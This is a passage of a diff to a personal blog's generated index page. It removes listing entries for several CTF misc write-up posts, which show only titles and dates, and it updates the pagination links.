-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2020/11/22/0xGame/">0xGame-misc wp</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2020-11-22T12:13:28.000Z" itemprop="datePublished">2020-11-22</time>
-</a>
-
-            
-<div class="article-tag-list">
-    <i class="icon-tag vm"></i>
-    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
-</div>
-
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>…</p>
-        
-        <p class="article-more-link">
-            <a href="/2020/11/22/0xGame/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2020/11/22/BUUCTF/">BUUCTF-misc wp</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2020-11-22T12:05:05.000Z" itemprop="datePublished">2020-11-22</time>
-</a>
-
-            
-<div class="article-tag-list">
-    <i class="icon-tag vm"></i>
-    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
-</div>
-
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>Todooooo</p>
-
-        
-        <p class="article-more-link">
-            <a href="/2020/11/22/BUUCTF/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2020/11/22/CTFshow/">CTFshow-misc wp</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2020-11-22T12:00:03.000Z" itemprop="datePublished">2020-11-22</time>
-</a>
-
-            
-<div class="article-tag-list">
-    <i class="icon-tag vm"></i>
-    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
-</div>
-
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>…</p>
-        
-        <p class="article-more-link">
-            <a href="/2020/11/22/CTFshow/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2020/11/22/XCTF/">XCTF-攻防世界-misc wp</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2020-11-22T11:59:24.000Z" itemprop="datePublished">2020-11-22</time>
-</a>
-
-            
-<div class="article-tag-list">
-    <i class="icon-tag vm"></i>
-    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
-</div>
-
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>…</p>
-        
-        <p class="article-more-link">
-            <a href="/2020/11/22/XCTF/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2020/11/22/UNCTF2020/">UNCTF2020-misc wp</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2020-11-22T11:58:07.000Z" itemprop="datePublished">2020-11-22</time>
-</a>
-
-            
-<div class="article-tag-list">
-    <i class="icon-tag vm"></i>
-    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
-</div>
-
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>…</p>
-        
-        <p class="article-more-link">
-            <a href="/2020/11/22/UNCTF2020/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2020/11/22/Hackergame2020/">Hackergame 2020-misc wp</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2020-11-22T11:50:21.000Z" itemprop="datePublished">2020-11-22</time>
-</a>
-
-            
-<div class="article-tag-list">
-    <i class="icon-tag vm"></i>
-    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
-</div>
-
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>…</p>
-        
-        <p class="article-more-link">
-            <a href="/2020/11/22/Hackergame2020/#more">
-                <span class="vm">阅读更多</span>
-                <i class="icon-arrow-double-right vm"></i>    
-            </a>
-        </p>
-        
-        
-    </section>
-</article>
-
-
-    <article class="article" itemscope itemprop="blogPost">
-    
-    <header class="article-header">
-        
-        <h1 itemprop="name">
-            <a href="/2020/11/22/0xCTF/">0xCTF-misc wp</a>
-        </h1>
-        
-        <div class="article-meta clearfix">
-            <a class="article-date" href="https://www.ayanagi.fun/page/2/index.html">
-    
-    <i class="icon-calendar vm"></i>
-    
-    <time class="vm" datetime="2020-11-22T09:48:45.000Z" itemprop="datePublished">2020-11-22</time>
-</a>
-
-            
-<div class="article-tag-list">
-    <i class="icon-tag vm"></i>
-    <a class="article-tag-link" href="/tags/CTF/" rel="tag">CTF</a>
-</div>
-
-
-        </div>
-    </header>
-    
-    <section class="article-body markdown-body">
-        
-        <p>…</p>
-        
-        <p class="article-more-link">
-            <a href="/2020/11/22/0xCTF/#more">
+            <a href="/2021/03/12/Reverse/#more">
                 <span class="vm">阅读更多</span>
                 <i class="icon-arrow-double-right vm"></i>    
             </a>
@@ -727,7 +802,7 @@
 
 
 <nav class="page-nav">
-    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
 </nav>
 
 
